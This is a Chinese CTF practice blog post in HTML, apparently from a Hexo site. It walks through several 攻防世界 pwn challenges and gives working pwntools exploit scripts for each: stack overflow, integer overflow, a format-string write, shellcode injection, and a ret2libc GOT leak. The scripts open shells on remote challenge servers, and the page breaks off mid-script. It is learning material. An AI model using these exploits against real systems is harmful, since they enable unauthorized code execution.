@@ -1,4 +1,588 @@
-<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#222"><meta name="generator" content="Hexo 4.2.1"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png"><link rel="icon" type="image/png" sizes="32x32" href="/images/2.ico"><link rel="icon" type="image/png" sizes="16x16" href="/images/2.ico"><link rel="mask-icon" href="/images/logo.svg" color="#222"><link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/lib/font-awesome/css/all.min.css"><script id="hexo-configurations">var NexT=window.NexT||{},CONFIG={hostname:"www.bxnop.cn",root:"/",scheme:"Gemini",version:"7.8.0",exturl:!1,sidebar:{position:"left",display:"post",padding:18,offset:12,onmobile:!1},copycode:{enable:!0,show_result:!0,style:null},back2top:{enable:!0,sidebar:!0,scrollpercent:!0},bookmark:{enable:!1,color:"#222",save:"auto"},fancybox:!1,mediumzoom:!1,lazyload:!1,pangu:!1,comments:{style:"tabs",active:null,storage:!0,lazyload:!1,nav:null},algolia:{hits:{per_page:10},labels:{input_placeholder:"Search for Posts",hits_empty:"We didn't find any results for the search: ${query}",hits_stats:"${hits} results found in ${time} ms"}},localsearch:{enable:!0,trigger:"auto",top_n_per_article:1,unescape:!1,preload:!1},motion:{enable:!0,async:!1,transition:{post_block:"fadeIn",post_header:"slideDownIn",post_body:"slideDownIn",coll_header:"slideLeftIn",sidebar:"slideUpIn"}},path:"search.xml"}</script><meta name="description" content="pwn的一些练习记录~"><meta property="og:type" content="article"><meta property="og:title" content="pwn练习"><meta property="og:url" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/index.html"><meta property="og:site_name" content="Bxb0&#39;s blog"><meta property="og:description" content="pwn的一些练习记录~"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200604180206603.png"><meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200604180443703.png"><meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605123722286.png"><meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605124200541.png"><meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605161502591.png"><meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605161944323.png"><meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605163357042.png"><meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605203928195.png"><meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605221940761.png"><meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605222351181.png"><meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605222611543.png"><meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605224545388.png"><meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605225102222.png"><meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200606091645885.png"><meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200606153058583.png"><meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200606155906601.png"><meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200606172047471.png"><meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200607160312039.png"><meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200607160518598.png"><meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200609105006912.png"><meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200609105624424.png"><meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200609105703718.png"><meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200609110724445.png"><meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200610140544469.png"><meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200610140847175.png"><meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200610171656557.png"><meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200610171941539.png"><meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200610172311560.png"><meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200610172459341.png"><meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200611162320998.png"><meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200611163417332.png"><meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200612101533939.png"><meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200603151159958.png"><meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200603151520348.png"><meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200603152007549.png"><meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200603152328450.png"><meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200603152657713.png"><meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605090406828.png"><meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605090938145.png"><meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605092003637.png"><meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200608181103998.png"><meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200608182629397.png"><meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200608183049831.png"><meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200608184738940.png"><meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605092808030-1591322466624.png"><meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605093020161.png"><meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605095114997.png"><meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605095231700.png"><meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605095322038.png"><meta property="og:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605095503617.png"><meta property="article:published_time" content="2020-06-04T05:05:44.000Z"><meta property="article:modified_time" content="2021-08-08T02:54:56.913Z"><meta property="article:author" content="ooo"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200604180206603.png"><link rel="canonical" href="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/"><script id="page-configurations">CONFIG.page={sidebar:"",isHome:!1,isPost:!0,lang:"en"}</script><title>pwn练习 | Bxb0's blog</title><noscript><style>.sidebar-inner,.use-motion .brand,.use-motion .collection-header,.use-motion .comments,.use-motion .menu-item,.use-motion .pagination,.use-motion .post-block,.use-motion .post-body,.use-motion .post-header{opacity:initial}.use-motion .site-subtitle,.use-motion .site-title{opacity:initial;top:initial}.use-motion .logo-line-before i{left:initial}.use-motion .logo-line-after i{right:initial}</style></noscript><link rel="alternate" href="/atom.xml" title="Bxb0's blog" type="application/atom+xml"></head><body itemscope itemtype="http://schema.org/WebPage"><div class="container use-motion"><div class="headband"></div><header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="header-inner"><div class="site-brand-container"><div class="site-nav-toggle"><div class="toggle" aria-label="Toggle navigation bar"><span class="toggle-line toggle-line-first"></span><span class="toggle-line toggle-line-middle"></span><span class="toggle-line toggle-line-last"></span></div></div><div class="site-meta"><a href="/" class="brand" rel="start"><span class="logo-line-before"><i></i></span><h1 class="site-title">Bxb0's blog</h1><span class="logo-line-after"><i></i></span></a></div><div class="site-nav-right"><div class="toggle popup-trigger"><i class="fa fa-search fa-fw fa-lg"></i></div></div></div><nav class="site-nav"><ul id="menu" class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i> Home</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i> Categories<span class="badge">14</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i> Archives<span class="badge">42</span></a></li><li class="menu-item menu-item-search"><a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i> Search</a></li></ul></nav><div class="search-pop-overlay"><div class="popup search-popup"><div class="search-header"><span class="search-icon"><i class="fa fa-search"></i></span><div class="search-input-container"> <input autocomplete="off" autocapitalize="off" placeholder="Searching..." spellcheck="false" type="search" class="search-input"></div><span class="popup-btn-close"><i class="fa fa-times-circle"></i></span></div><div id="search-result"><div id="no-result"><i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i></div></div></div></div></div></header><main class="main"><div class="main-inner"><div class="content-wrap"><div class="content post posts-expand"><article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en"><link itemprop="mainEntityOfPage" href="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/avatar.gif"><meta itemprop="name" content="ooo"><meta itemprop="description" content="0x446e37fb"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="Bxb0's blog"></span><header class="post-header"><h1 class="post-title" itemprop="name headline"> pwn练习</h1><div class="post-meta"><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar"></i></span> <span class="post-meta-item-text">Posted on</span> <time title="Created: 2020-06-04 13:05:44" itemprop="dateCreated datePublished" datetime="2020-06-04T13:05:44+08:00">2020-06-04</time></span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-folder"></i></span> <span class="post-meta-item-text">In</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Pwn/" itemprop="url" rel="index"><span itemprop="name">Pwn</span></a></span></span><br><span class="post-meta-item" title="Symbols count in article"><span class="post-meta-item-icon"><i class="far fa-file-word"></i></span> <span class="post-meta-item-text">Symbols count in article:</span> <span>11k</span></span><span class="post-meta-item" title="Reading time"><span class="post-meta-item-icon"><i class="far fa-clock"></i></span> <span class="post-meta-item-text">Reading time &asymp;</span> <span>10 mins.</span></span></div></header><div class="post-body" itemprop="articleBody"><p>pwn的一些练习记录~<a id="more"></a></p><h2 id="攻防世界"><a href="#攻防世界" class="headerlink" title="攻防世界"></a>攻防世界</h2><h3 id="guess-num"><a href="#guess-num" class="headerlink" title="guess_num"></a>guess_num</h3><blockquote><p>栈溢出</p></blockquote><p>ida打开看一下。</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200604180206603.png" alt="image-20200604180206603"></p><p>可以知道这个随机数种子我们是不知道的，但是可以直接通过gets(v7)，通过栈溢出把这个种子换成1，再用1计算出随机数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'220.249.52.133'</span>, <span class="number">46809</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x20</span>*<span class="string">'a'</span> + p32(<span class="number">1</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">l = <span class="string">'2542625142'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> l:</span><br><span class="line">	p.recvuntil(<span class="string">'input'</span>)</span><br><span class="line">	p.sendline(i)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200604180443703.png" alt="image-20200604180443703"></p><p><strong>总结：对栈更加熟悉。</strong></p><h3 id="cgpwn2"><a href="#cgpwn2" class="headerlink" title="cgpwn2"></a>cgpwn2</h3><blockquote><p>栈溢出，控制程序走向</p></blockquote><p> 使用checksec看一保护，没有canary。</p><p> ida中看一下，gets()存在溢出，有system()函数，但是字符串不是我们想要的shell。和之前在论剑场做过的很像，只不过那个是64位，这个是32位，参数传递不同而已。</p><p> <img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605123722286.png" alt="image-20200605123722286"></p><p> 尝试使用 ROPgadget搜索<strong>$0</strong>,无果。但回到程序看到有一个全局变量让我们输入name，那就自己构造。</p><p> 找到system的地址，写py脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'220.249.52.133'</span>, <span class="number">53127</span>)</span><br><span class="line">s = <span class="string">'$0'</span> <span class="comment">#这里也可以'/bin/sh'</span></span><br><span class="line">p.recvuntil(<span class="string">'name'</span>)</span><br><span class="line">p.sendline(s)</span><br><span class="line"></span><br><span class="line">payload = (<span class="number">0x26</span>+<span class="number">4</span>)*<span class="string">'a'</span> + p32(<span class="number">0x0804855A</span>) + p32(<span class="number">0x0804A080</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'here:'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>得到shell。</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605124200541.png" alt="image-20200605124200541"></p><p><strong>总结：上次是64位，这次体验了32位程序，传参不同。</strong></p><h3 id="int-overflow"><a href="#int-overflow" class="headerlink" title="int_overflow"></a>int_overflow</h3><blockquote><p>栈溢出，整数溢出</p></blockquote><p>没有开启canary，在ida中可以看到第一个login函数都不存在溢出。</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605161502591.png" alt="image-20200605161502591"></p><p>但从搜索的字符串找到引用，有一个system(“cat flag”)，所以还是考虑通过栈溢出控制程序走向。</p><p>果然在<strong>check_passwd（&amp;buf）</strong>存在栈溢出，这里就是多了个整数溢出。</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605161944323.png" alt="image-20200605161944323"></p><p>由于一个字节无符号的范围（0-255），那我们最小只要260就可以让v3==4即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'220.249.52.133'</span>, <span class="number">54696</span>)</span><br><span class="line">payload = (<span class="number">0x14</span>+<span class="number">4</span>)*<span class="string">'a'</span> + p32(<span class="number">0x08048694</span>) + (<span class="number">260</span><span class="number">-28</span>)*<span class="string">'a'</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'choice:'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'username:'</span>)</span><br><span class="line">p.sendline(<span class="string">'Bnop'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'passwd:'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605163357042.png" alt="image-20200605163357042"></p><p><strong>总结：对整数溢出有了了解。</strong></p><h3 id="string"><a href="#string" class="headerlink" title="string"></a>string</h3><blockquote><p>格式化字符换漏洞，写入shellcode。但是有很多逻辑干扰，关键还是分析到强制转化为函数到执行，联系到执行自己的shellcode。</p></blockquote><p>程序除了基址随机化保护关了，其他全开。</p><p>载入ida找漏洞，感觉有点复杂，一个小游戏，函数有点多。但是由于没有关键字符串与system（）函数，这时候就可以往写shellcode方面想。果然在<strong>sub_400CA6((_DWORD *)a1);</strong>中找到了。</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605203928195.png" alt="image-20200605203928195"></p><p>但要使整个函数执行，上面有个判断，<strong>*a1 == a1[1]</strong>，寻找*a1的参数来源，可以知道使main()函数里的v4。</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605221940761.png" alt="image-20200605221940761"></p><p>这时候看有没有地方可以让着2个数相等。还有2个关键函数仔细看的。</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605222351181.png" alt="image-20200605222351181"></p><p>进入<strong>sub_400A7D()</strong>，直接输入east跳过就好了。</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605222611543.png" alt="image-20200605222611543"></p><p>再看<strong>sub_400BB9()</strong>,正好这里有这个漏洞，且有提示信息。</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605224545388.png" alt="image-20200605224545388"></p><p>下面用gdb调试看看v2的值在第几个参数位置。在printf()处下断点。</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605225102222.png" alt="image-20200605225102222"></p><p>但是注意这是64位程序，先是使用6个寄存器传递参数（rdi, rsi, rdx, rcx, r8, r9）,而这里<strong>rdi</strong>作为了格式化字符串的参数，那寄存器还有5个用来传递参数，那我们的改变地址的值就是第(5+2) = 7个参数了。</p><p>开始写脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = 'debug' 这个可以将每一步的调试信息反馈给用户。</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'220.249.52.133'</span>, <span class="number">46461</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'secret[0] is '</span>)</span><br><span class="line">addr = int(p.recv(<span class="number">7</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'name be:'</span>)</span><br><span class="line">p.sendline(<span class="string">'Bnop'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'east or up?:'</span>)</span><br><span class="line">p.sendline(<span class="string">'east'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'leave(0)?:'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"address'"</span>)</span><br><span class="line">p.sendline(str(addr))</span><br><span class="line">p.recvuntil(<span class="string">'wish is:'</span>)</span><br><span class="line">p.sendline(<span class="string">'%085d%7$n'</span>)</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">'linux'</span>,arch=<span class="string">'amd64'</span>) <span class="comment">#这里shellcode的2中写法。</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"><span class="comment">#shellcode="\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05"</span></span><br><span class="line">p.recvuntil(<span class="string">'YOU SPELL'</span>)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200606091645885.png" alt="image-20200606091645885"></p><p><strong>总结：1.shellcode的写法：一：通过shellcraft 一个生成shellcode的类。shellcraft.sh()获得执行system(“/bin/sh”)汇编代码所对应的机器码。二：通过反汇编的shellcode代码。2.对格式化字符串漏洞及64位传参加深了理解。3.分析长的题目。</strong></p><h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><blockquote><p>开始查保护后没注意到NX，在栈上几次没执行成功才回去看到。这个题实际还是栈溢出，但多考了很多知识点，对刚接触pwn收获还是很大。</p></blockquote><p>首先查保护，只开了NX，没有canary，那就可以往靠溢出控制程序走向了的方向看题。</p><p>载入ida后，栈溢出很明显。</p><p> <img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200606153058583.png" alt="image-20200606153058583"></p><p>但利用起来，既没有有system函数，也没有’/bin/sh’。这对于刚接触pwn还是比较困难的，但本来就学习的过程，看了writeup又去学了下.plt与.got再来做的题。</p><p>其实程序带了一个运行库的，里面有动态链接库的函数及一些其他信息。既然程序里没有自然就利用这个运行库了，根据elf文件与pe文件类似，各个函数与数据的相对地址是不变的。利用这一点与我们在程序中是调用了write与read动态库函数的，随便选择一个得到他们的地址，再根据相对地址相加减就得到我们要的函数与数据（system()与‘/bin/sh’）的地址了。</p><p>首先计算在运行库里的的read函数与system函数的相对地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">lib = ELF(<span class="string">'./libc_32.so.6'</span>)</span><br><span class="line"></span><br><span class="line">sys_cha = hex(lib.symbols[<span class="string">'system'</span>]-lib.symbols[<span class="string">'read'</span>])</span><br></pre></td></tr></table></figure><p>计算运行库中read函数与 ‘/bin/sh’的相对地址。先找到 ’/bin/sh’的地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary libc_32.so<span class="number">.6</span> --string <span class="string">'/bin/sh'</span></span><br></pre></td></tr></table></figure><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200606155906601.png" alt="image-20200606155906601"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">lib = ELF(<span class="string">'./libc_32.so.6'</span>)</span><br><span class="line"></span><br><span class="line">bin_cha = hex(<span class="number">0x0015902b</span>-lib.symbols[<span class="string">'read'</span>])</span><br></pre></td></tr></table></figure><p>有 a-b=c，现在我们有了c，只需通过程序溢出就可以找到b, 最后通 a = b+c得到我们要的地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'220.249.52.133'</span>, <span class="number">54407</span>)</span><br><span class="line">elf = ELF(<span class="string">'./level3'</span>)</span><br><span class="line"></span><br><span class="line">payload = (<span class="number">0x88</span>+<span class="number">4</span>)*<span class="string">'a'</span>+p32(elf.plt[<span class="string">'write'</span>])+p32(elf.symbols[<span class="string">'main'</span>])+p32(<span class="number">1</span>)+p32(elf.got[<span class="string">'read'</span>])+p32(<span class="number">8</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Input:\n'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">read_addr = u32(p.recv()[:<span class="number">4</span>])</span><br></pre></td></tr></table></figure><p>将各部分结合起来，脚本攻击。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'220.249.52.133'</span>, <span class="number">54407</span>)</span><br><span class="line">elf = ELF(<span class="string">'./level3'</span>)</span><br><span class="line">lib = ELF(<span class="string">'./libc_32.so.6'</span>)</span><br><span class="line"></span><br><span class="line">payload = (<span class="number">0x88</span>+<span class="number">4</span>)*<span class="string">'a'</span>+p32(elf.plt[<span class="string">'write'</span>])+p32(elf.symbols[<span class="string">'main'</span>])+p32(<span class="number">1</span>)+p32(elf.got[<span class="string">'read'</span>])+p32(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Input:\n'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">read_addr = u32(p.recv()[:<span class="number">4</span>])</span><br><span class="line"></span><br><span class="line">bin_cha = int(<span class="number">0x0015902b</span>-lib.symbols[<span class="string">'read'</span>])</span><br><span class="line">bin_addr = read_addr + bin_cha</span><br><span class="line"></span><br><span class="line">sys_cha = int(lib.symbols[<span class="string">'system'</span>]-lib.symbols[<span class="string">'read'</span>])</span><br><span class="line">sys_addr = read_addr + sys_cha</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Input:\n'</span>)</span><br><span class="line">payload1 = (<span class="number">0x88</span>+<span class="number">4</span>)*<span class="string">'a'</span>+p32(sys_addr)+p32(<span class="number">1</span>)+p32(bin_addr)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200606172047471.png" alt="image-20200606172047471"></p><p><strong>总结：1.u32()相当于p32()的逆运算。2.ELF的各种使用。3.对.plt与.got的学习。4. 从运行库寻找所要函数与数据。5.这道题对于刚接触pwn的来做，可做性很高。</strong></p><h3 id="dice-game"><a href="#dice-game" class="headerlink" title="dice_game"></a>dice_game</h3><blockquote><p>上之前做的 guess_game 一个道理。通过栈溢出，改变程序特定的值。</p></blockquote><p>查保护没有 canary，这也算是引导了，因为是做题。</p><p>ida中看一下。就是随机数种子精确到了秒，所以直接通过栈溢出改变种子的值。</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200607160312039.png" alt="image-20200607160312039"></p><p>写脚本攻击。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span 